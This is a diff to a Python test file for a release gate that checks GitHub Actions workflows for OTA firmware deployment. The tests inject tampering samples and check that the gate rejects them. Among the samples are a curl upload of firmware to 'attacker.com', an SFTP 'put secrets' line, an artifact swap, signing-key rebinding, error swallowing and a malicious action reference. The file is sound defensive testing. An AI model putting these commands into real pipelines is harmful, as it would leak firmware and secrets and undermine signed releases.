@@ -423,16 +423,142 @@ class OtaContractGateTest(unittest.TestCase):
       gate.validate_workflow_release_triggers(workflows)
 
 
-  def test_ordinary_build_shell_sftp_command_is_rejected(self):
-    workflows = self._workflow_sources()
-    target_workflow = ".github/workflows/deploy.yml"
-    workflows[target_workflow] = workflows[target_workflow].replace(
-        "    steps:\n",
-        "    steps:\n      - name: Shell SFTP exfiltration\n        run: sftp user@host <<< 'put secrets'\n",
-    )
-    with self.assertRaisesRegex(gate.GateError, "production or SFTP deployment capability"):
-      gate.validate_workflow_release_triggers(workflows)
+  def test_same_line_evidence_error_swallowing_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
+            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" || true',
+        )
+        with self.assertRaisesRegex(gate.GateError, "swallow errors"):
+          gate.validate_workflow_release_triggers(workflows)
 
+  def test_same_line_post_validation_artifact_replacement_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
+            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" && cp attacker.bin dist/artifact',
+        )
+        with self.assertRaisesRegex(gate.GateError, "swallow errors|alter artifacts|flags mismatch"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_printf_or_read_signing_key_rebinding_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
+            'printf -v OTA_SIGNING_PUBLIC_KEY_HEX "000"\n          --public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
+        )
+        with self.assertRaisesRegex(gate.GateError, "redefined in run script|flags mismatch"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_duplicate_evidence_step_identity_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "      - name: Enforce OTA production release evidence\n",
+            "      - name: Enforce OTA production release evidence\n"
+            "        run: python scripts/ota_contract_gate.py release --evidence ota/release-evidence.json --manifest dist/version.json --artifact dist/gatekeeper-firmware.bin --public-key-hex \"$OTA_SIGNING_PUBLIC_KEY_HEX\"\n"
+            "      - name: Enforce OTA production release evidence\n",
+        )
+        with self.assertRaisesRegex(gate.GateError, "step count must be exactly|order violated"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_alternate_scp_sftp_action_variants_are_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "wlixcc/SFTP-Deploy-Action@v1.2.4",
+            "appleboy/scp-action@master",
+        )
+        with self.assertRaisesRegex(gate.GateError, "uses mismatch"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_ordinary_build_job_curl_upload_file_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "    steps:\n",
+            "    steps:\n      - name: Curl upload exfiltration\n        run: curl --upload-file dist/firmware.bin ftp://attacker.com/\n",
+        )
+        with self.assertRaisesRegex(gate.GateError, "production or SFTP deployment capability"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_arbitrary_unknown_action_uses_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "    steps:\n",
+            "    steps:\n      - name: Unknown action\n        uses: hacker/malicious-action@v1\n",
+        )
+        with self.assertRaisesRegex(gate.GateError, "unallowed action"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_arbitrary_unknown_step_in_release_job_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "  release_to_production:\n",
+            "  release_to_production:\n    # extra step\n",
+        )
+        # Add an extra step inside release_to_production steps
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "      - name: Checkout repository\n",
+            "      - name: Extra unauthorized step\n        run: echo compromised\n      - name: Checkout repository\n",
+        )
+        with self.assertRaisesRegex(gate.GateError, "step count must be|order violated|name mismatch"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_unallowed_top_level_key_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = "env:\n  MALICIOUS: 'true'\n" + workflows[target_workflow]
+        with self.assertRaisesRegex(gate.GateError, "top-level contains unallowed keys"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_unallowed_job_in_workflow_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "jobs:\n",
+            "jobs:\n  extra_backdoor_job:\n    runs-on: ubuntu-latest\n    steps: []\n",
+        )
+        with self.assertRaisesRegex(gate.GateError, "unexpected job in workflow"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_unallowed_top_level_permissions_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "permissions:\n  contents: read",
+            "permissions:\n  contents: write",
+        )
+        with self.assertRaisesRegex(gate.GateError, "top-level permissions must be exact mapping"):
+          gate.validate_workflow_release_triggers(workflows)
+
+  def test_unallowed_trigger_in_workflow_is_rejected_both_workflows(self):
+    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
+      with self.subTest(workflow=target_workflow):
+        workflows = self._workflow_sources()
+        workflows[target_workflow] = workflows[target_workflow].replace(
+            "on:\n",
+            "on:\n  schedule:\n    - cron: '* * * * *'\n",
+            1
+        )
+        with self.assertRaisesRegex(gate.GateError, "workflow contains unallowed triggers"):
+          gate.validate_workflow_release_triggers(workflows)
 
 if __name__ == "__main__":
   unittest.main()
